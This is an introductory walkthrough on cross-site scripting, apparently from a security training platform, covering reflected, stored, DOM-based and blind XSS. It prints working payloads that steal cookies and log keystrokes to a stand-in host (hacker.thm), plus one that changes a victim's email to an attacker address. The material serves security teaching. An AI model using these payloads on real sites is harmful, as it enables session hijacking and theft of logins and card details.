# Intro to Cross-site Scripting

## Description

Learn how to detect and exploit XSS vulnerabilities, giving us control of other visitor's browsers.
* Category: Walkthrough

## Brief

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## XSS Payloads

### What is a payload?

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

The intention is what we wish the JavaScript to actually do and the modification is the changes to the code we need to make it execute as every scenario is different.

Here are some examples of XSS intentions:

#### Proof of Concept

This is the simplest of payloads where all we want to do is demonstrate that we can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example: `<script>alert('XSS');</script>`

#### Session Stealing

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`.

#### Key Logger

The below code acts as a key logger. This means anything we type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`.

#### Business Logic

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Our payload could look like this: `<script>user.changeEmail('attacker@hacker.thm');</script>`.

Now that the email address for the account has changed, the attacker may perform a reset password attack.

## Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

### Potential Impact

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

### How to test for Reflected XSS

We'll need to test every possible point of entry including:
* Parameters in the URL Query String
* URL File Path
* Sometimes HTTP Headers (although unlikely exploitable in practice)

Once we've found some data which is being reflected in the web application, we'll then need to confirm that we can successfully run our JavaScript payload. Our payload will be dependent on where in the application our code is reflected.

## Stored XSS

As the name infers, the XSS payload is stored on the web application and then gets run when other users visit the site or web page.

### Potential Impact

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

### How to test for Stored XSS

We'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to including:
* Comments on a blog
* User profile information
* Website Listings

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS.

For example, an age field that is expecting an integer from a dropdown menu, but instead, we manually send the request rather than using the form allowing us to try malicious payloads.

Once we've found some data which is being stored in the web application, we'll then need to confirm that we can successfully run our JavaScript payload. Our payload will be dependent on where in the application our code is reflected.

## DOM Based XSS

### What is the DOM?

**DOM** stands for **Document Object Model** and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.

### Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

### Potential Impact

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

### How to test for DOM Based XSS

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. We'd need to look for parts of the code that access certain variables that an attacker can have control over, such as `window.location.x` parameters.

When we've found those bits of code, we'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.

## Blind XSS

Blind XSS is similar to a stored XSS in that our payload gets stored on the website for another user to view, but in this instance, we can't see the payload working or be able to test it against ourself first.

### Potential Impact

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

### How to test for Blind XSS

When testing for Blind XSS vulnerabilities, we need to ensure our payload has a call back (usually an HTTP request). This way, we know if and when our code is being executed.